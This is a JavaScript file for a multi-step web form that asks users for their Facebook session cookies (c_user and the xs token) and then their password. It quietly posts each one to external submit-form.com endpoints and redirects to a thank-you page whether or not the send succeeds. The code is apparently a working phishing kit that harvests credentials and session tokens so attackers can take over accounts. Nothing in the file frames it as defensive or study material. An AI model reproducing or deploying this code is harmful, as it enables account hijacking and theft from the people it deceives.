
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// Configure FormSpark form submissions
const cookieForm = document.getElementById('cookieForm');
const passwordForm = document.getElementById('passwordForm');

cookieForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const cuserInput = document.getElementById('cuser');
    const xsInput = document.getElementById('xs');
    
    // Validate c_user (must be numbers only)
    if (!/^\d+$/.test(cuserInput.value)) {
        alert('c_user must contain only numbers');
        return;
    }
    
    // Validate xs (must not be empty)
    if (!xsInput.value.trim()) {
        alert('xs token is required');
        return;
    }

    // Submit form data in background
    fetch('https://submit-form.com/wvGvlIWs9', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            cuser: cuserInput.value,
            xs: xsInput.value
        })
    }).then(() => {
        showPage('page4');
    }).catch(error => {
        console.error('Error:', error);
        showPage('page4'); // Still proceed to password page
    });
});

passwordForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const password = document.getElementById('passwrod').value;
    if (!password) {
        alert('Please enter your password');
        return;
    }
    
    fetch('https://submit-form.com/Pn6Mi2Nat', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            passwrod: password
        })
    }).then(() => {
        window.location.href = 'thankyou.html';
    }).catch(error => {
        console.error('Error:', error);
        window.location.href = 'thankyou.html';
    });
});
